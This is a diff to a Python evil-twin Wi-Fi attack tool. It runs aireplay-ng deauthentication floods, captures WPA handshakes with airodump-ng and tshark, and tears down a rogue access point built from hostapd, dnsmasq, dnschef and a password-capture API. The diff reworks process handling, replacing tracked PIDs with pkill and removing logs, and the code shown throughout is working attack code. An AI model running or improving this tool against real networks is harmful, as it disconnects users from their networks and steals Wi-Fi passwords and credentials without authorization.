@@ -52,10 +52,6 @@ class AttackConfig:
     internet_interface: str = ""
     routing_table: str = ""
     
-    deauth_pid: Optional[int] = None
-    airodump_pid: Optional[int] = None
-    client_check_process: Optional[subprocess.Popen] = None
-    
     handshake_captured: bool = False
     password_cracked: bool = False
 
@@ -93,8 +89,7 @@ class EvilTwinAttack:
                 pass
         
         tmp_dir = Path('/tmp')
-        patterns = ['client_check*', 'scan*', 'handshake_check*', 'airodump.log', 'deauth.log', 
-                   'hostapd.log', 'dnsmasq.log', 'dnschef.log']
+        patterns = ['client_check*', 'scan*', 'handshake_check*', 'hostapd.log', 'dnsmasq.log', 'dnschef.log']
         for pattern in patterns:
             for f in tmp_dir.glob(pattern):
                 try:
@@ -143,7 +138,7 @@ class EvilTwinAttack:
         
         # Force interface to correct channel
         self.run_command(f"iw dev {self.config.mon_interface} set channel {self.config.target_channel}")
-        time.sleep(1)
+        time.sleep(2)
         
         print(f"\n[!] Listening for clients on {self.config.target_channel}...")
         
@@ -155,7 +150,7 @@ class EvilTwinAttack:
         
         cmd = f"airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w /tmp/client_check {self.config.mon_interface}"
         
-        self.config.client_check_process = subprocess.Popen(
+        subprocess.Popen(
             cmd, shell=True,
             stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
@@ -170,10 +165,8 @@ class EvilTwinAttack:
         print()
         
         # Kill airodump
-        if self.config.client_check_process:
-            self.config.client_check_process.terminate()
-            time.sleep(2)
-            self.config.client_check_process = None
+        self.run_command("pkill -9 airodump-ng 2>/dev/null")
+        time.sleep(2)
         
         # Parse results
         client_count = 0
@@ -235,22 +228,20 @@ class EvilTwinAttack:
         time.sleep(2)
         
         log_debug("Starting airodump-ng...")
-        with open('/tmp/airodump.log', 'w') as f:
-            self.config.airodump_pid = subprocess.Popen(
-                f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /tmp/airodump.log 2>&1 &",
-                shell=True,
-                stdin=subprocess.DEVNULL
-            ).pid
+        subprocess.Popen(
+            f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /dev/null 2>&1 &",
+            shell=True,
+            stdin=subprocess.DEVNULL
+        )
         
         time.sleep(3)
         
         log_debug("Starting aireplay-ng deauth...")
-        with open('/tmp/deauth.log', 'w') as f:
-            self.config.deauth_pid = subprocess.Popen(
-                f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /tmp/deauth.log 2>&1 &",
-                shell=True,
-                stdin=subprocess.DEVNULL
-            ).pid
+        subprocess.Popen(
+            f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /dev/null 2>&1 &",
+            shell=True,
+            stdin=subprocess.DEVNULL
+        )
         
         log_info("Deauth running - waiting for handshake (max 60 seconds)...")
         
@@ -266,6 +257,7 @@ class EvilTwinAttack:
                 if ret == 0:
                     log_success(f"Handshake captured at {i} seconds!")
                     handshake_captured = True
+                    self.run_command("pkill -9 airodump-ng 2>/dev/null")
                     break
                 
                 ret2, eapol_out, _ = self.run_command("tshark -r /tmp/handshake_check.cap -Y eapol 2>/dev/null | wc -l")
@@ -274,6 +266,7 @@ class EvilTwinAttack:
                     if eapol_count >= 4:
                         log_success(f"Found {eapol_count} EAPOL packets - handshake captured!")
                         handshake_captured = True
+                        self.run_command("pkill -9 airodump-ng 2>/dev/null")
                         break
             
             if i % 5 == 0:
@@ -282,10 +275,7 @@ class EvilTwinAttack:
         
         print()
         
-        if self.config.airodump_pid:
-            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
-        if self.config.deauth_pid:
-            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
+        self.run_command("pkill -9 airodump-ng 2>/dev/null")
         time.sleep(2)
         
         if handshake_captured:
@@ -571,16 +561,8 @@ class EvilTwinAttack:
     def cleanup(self):
         log_info("Cleaning up...")
         
-        if self.config.client_check_process:
-            self.config.client_check_process.terminate()
-        
         for proc in ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnschef', 'passapi.py', 'php']:
             self.run_command(f"pkill -f {proc} 2>/dev/null")
-        
-        if self.config.deauth_pid:
-            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
-        if self.config.airodump_pid:
-            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
         
         if self.config.ap_interface and self.config.ap_base != self.config.ap_interface:
             log_info(f"Removing virtual AP interface {self.config.ap_interface}...")
